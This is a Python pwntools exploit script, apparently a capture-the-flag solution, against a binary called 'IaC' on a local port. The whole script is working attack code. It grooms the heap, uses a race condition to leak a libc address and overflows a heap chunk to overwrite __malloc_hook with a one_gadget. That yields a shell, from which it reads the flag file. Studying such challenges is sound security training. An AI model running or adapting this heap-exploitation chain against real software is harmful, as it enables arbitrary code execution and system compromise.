#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './IaC'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'localhost', 10027

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def create(idx, size, data):
    io.sendlineafter('Input:', b'0')
    io.sendlineafter('>>', str(idx).encode())
    io.sendlineafter('>>', str(size).encode())
    io.sendlineafter('>>', data)

def delete(idx):
    io.sendlineafter('Input:', b'1')
    io.sendlineafter('>>', str(idx).encode())

def launch(idx):
    io.sendlineafter('Input:', b'2')
    io.sendlineafter('>>', str(idx).encode())

def terminate():
    io.sendlineafter('Input:', b'3')

def exploit():
    global io
    io = initialize()

    # leak libc, race leak
    for i in range(8):
        create(i, 10, 'A'*5)

    create(8, 10, 'A'*5)
    create(9, 10, 'A'*5)

    create(10, 400, 'C'*50)

    for i in range(8):
        delete(i)
    delete(9)

    launch(8)
    sleep(7)
    
    terminate()
    launch(10)
    sleep(7)

    io.recvlines(3)
    io.recv(138 + 8)
    leak = u64(io.recv(8).ljust(8, b'\x00'))
    # libc.address = leak - 0x9d1be0
    libc.address = leak - 0x3ebca0

    # reset bins
    for i in range(8):
        create(i, 10, 'A'*5)
    create(9, 10, 'A'*5)

    # heap overflow, race leak
    payload = p64(libc.sym['__malloc_hook'])

    create(0, 240, 'A'*119)
    create(1, 112, payload)
    create(2, 240, 'C'*119)
    create(3, 240, 'D'*119)

    delete(3)
    delete(2)

    launch(1)
    sleep(3)
    launch(0)

    one_gadgets = [0x4f2a5, 0x4f302, 0x10a2fc]
    create(4, 50, 'A'*5)
    create(5, 50, p64(libc.address + one_gadgets[1])) 

    # trigger malloc hook
    create(1, 12, '12')

    io.sendline('cat /flag*')

    info('leak: %#x', leak)
    info('libc base: %#x', libc.address)
    info('__free_hook: %#x', libc.sym['__free_hook'])
    info('__malloc_hook: %#x', libc.sym['__malloc_hook'])
    io.interactive()
    
if __name__ == '__main__':
    exploit()